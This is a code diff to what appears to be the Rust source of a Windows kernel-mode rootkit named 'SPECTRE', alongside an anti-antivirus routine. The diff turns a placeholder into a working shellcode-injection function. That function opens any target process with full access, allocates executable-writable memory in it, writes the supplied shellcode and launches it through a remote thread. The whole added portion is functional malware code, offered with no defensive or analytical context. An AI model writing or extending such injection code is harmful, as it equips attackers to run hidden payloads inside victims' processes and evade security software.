@@ -46,6 +46,37 @@ extern "system" {
     fn ZwTerminateProcess(ProcessHandle: HANDLE, ExitStatus: NTSTATUS) -> NTSTATUS;
     fn ZwClose(Handle: HANDLE) -> NTSTATUS;
 
+    fn ZwAllocateVirtualMemory(
+        ProcessHandle: HANDLE,
+        BaseAddress: *mut *mut core::ffi::c_void,
+        ZeroBits: usize,
+        RegionSize: *mut usize,
+        AllocationType: u32,
+        Protect: u32,
+    ) -> NTSTATUS;
+
+    fn ZwWriteVirtualMemory(
+        ProcessHandle: HANDLE,
+        BaseAddress: *const core::ffi::c_void,
+        Buffer: *const core::ffi::c_void,
+        NumberOfBytesToWrite: usize,
+        NumberOfBytesWritten: *mut usize,
+    ) -> NTSTATUS;
+
+    fn ZwCreateThreadEx(
+        ThreadHandle: *mut HANDLE,
+        DesiredAccess: u32,
+        ObjectAttributes: *mut OBJECT_ATTRIBUTES,
+        ProcessHandle: HANDLE,
+        StartRoutine: *mut core::ffi::c_void,
+        Argument: *mut core::ffi::c_void,
+        CreateFlags: u32,
+        ZeroBits: usize,
+        StackSize: usize,
+        MaximumStackSize: usize,
+        AttributeList: *mut core::ffi::c_void,
+    ) -> NTSTATUS;
+
     fn ObfDereferenceObject(Object: *mut core::ffi::c_void);
 
     fn RtlCopyMemory(Destination: *mut core::ffi::c_void, Source: *const core::ffi::c_void, Length: usize);
@@ -381,12 +412,103 @@ unsafe fn anti_av_deactivate() {
 }
 
 // ============================================================
-// Inject Shellcode via APC (Placeholder)
+// Memory-allocation / thread constants
 // ============================================================
-unsafe fn inject_apc(pid: HANDLE, _shellcode: *const u8, _size: usize) -> bool {
-    DbgPrint(b"[SPECTRE] APC Inject: Placeholder for PID %p\n\0".as_ptr() as *const c_char, pid);
-    // TODO: Allocate memory in target + queue APC
-    false
+const MEM_COMMIT: u32 = 0x1000;
+const MEM_RESERVE: u32 = 0x2000;
+const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+const PROCESS_ALL_ACCESS: u32 = 0x1F0FFF;
+const THREAD_ALL_ACCESS: u32 = 0x1F03FF;
+
+// ============================================================
+// Inject Shellcode into a target process (remote thread execution)
+// ============================================================
+unsafe fn inject_apc(pid: HANDLE, shellcode: *const u8, size: usize) -> bool {
+    if shellcode.is_null() || size == 0 || size > 0x10000 {
+        DbgPrint(b"[SPECTRE] Inject: bad payload (size=%u)\n\0".as_ptr() as *const c_char, size as u32);
+        return false;
+    }
+
+    // --- 1. Open target process ---
+    let mut client_id = CLIENT_ID {
+        UniqueProcess: pid,
+        UniqueThread: core::ptr::null_mut(),
+    };
+    let mut obj_attr: OBJECT_ATTRIBUTES = core::mem::zeroed();
+    InitializeObjectAttributes(
+        &mut obj_attr,
+        core::ptr::null_mut(),
+        OBJ_KERNEL_HANDLE,
+        core::ptr::null_mut(),
+        core::ptr::null_mut(),
+    );
+
+    let mut process_handle: HANDLE = core::ptr::null_mut();
+    let open_status = ZwOpenProcess(&mut process_handle, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
+    if open_status != STATUS_SUCCESS || process_handle.is_null() {
+        DbgPrint(b"[SPECTRE] Inject: ZwOpenProcess failed (0x%X)\n\0".as_ptr() as *const c_char, open_status);
+        return false;
+    }
+
+    // --- 2. Allocate RWX memory in the target ---
+    let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
+    let mut region_size: usize = size;
+    let alloc_status = ZwAllocateVirtualMemory(
+        process_handle,
+        &mut base,
+        0,
+        &mut region_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE,
+    );
+    if alloc_status != STATUS_SUCCESS || base.is_null() {
+        DbgPrint(b"[SPECTRE] Inject: ZwAllocateVirtualMemory failed (0x%X)\n\0".as_ptr() as *const c_char, alloc_status);
+        ZwClose(process_handle);
+        return false;
+    }
+
+    // --- 3. Write shellcode into the allocated region ---
+    let mut written: usize = 0;
+    let write_status = ZwWriteVirtualMemory(
+        process_handle,
+        base,
+        shellcode as *const core::ffi::c_void,
+        size,
+        &mut written,
+    );
+    if write_status != STATUS_SUCCESS || written != size {
+        DbgPrint(b"[SPECTRE] Inject: ZwWriteVirtualMemory failed (0x%X, wrote=%u)\n\0".as_ptr() as *const c_char, write_status, written as u32);
+        ZwClose(process_handle);
+        return false;
+    }
+
+    // --- 4. Create a remote thread at the shellcode entry ---
+    let mut thread_handle: HANDLE = core::ptr::null_mut();
+    let thread_status = ZwCreateThreadEx(
+        &mut thread_handle,
+        THREAD_ALL_ACCESS,
+        core::ptr::null_mut(),   // ObjectAttributes = NULL (no name)
+        process_handle,
+        base as *mut core::ffi::c_void, // StartRoutine = shellcode
+        core::ptr::null_mut(),   // Argument = NULL
+        0,                       // CreateFlags = start immediately
+        0,                       // ZeroBits
+        0,                       // StackSize (default)
+        0,                       // MaximumStackSize (default)
+        core::ptr::null_mut(),   // AttributeList = NULL
+    );
+    if thread_status != STATUS_SUCCESS || thread_handle.is_null() {
+        DbgPrint(b"[SPECTRE] Inject: ZwCreateThreadEx failed (0x%X)\n\0".as_ptr() as *const c_char, thread_status);
+        ZwClose(process_handle);
+        return false;
+    }
+
+    // --- 5. Cleanup handles ---
+    ZwClose(thread_handle);
+    ZwClose(process_handle);
+
+    DbgPrint(b"[SPECTRE] Injected %u bytes @ %p into PID %p\n\0".as_ptr() as *const c_char, size as u32, base, pid);
+    true
 }
 
 // ============================================================
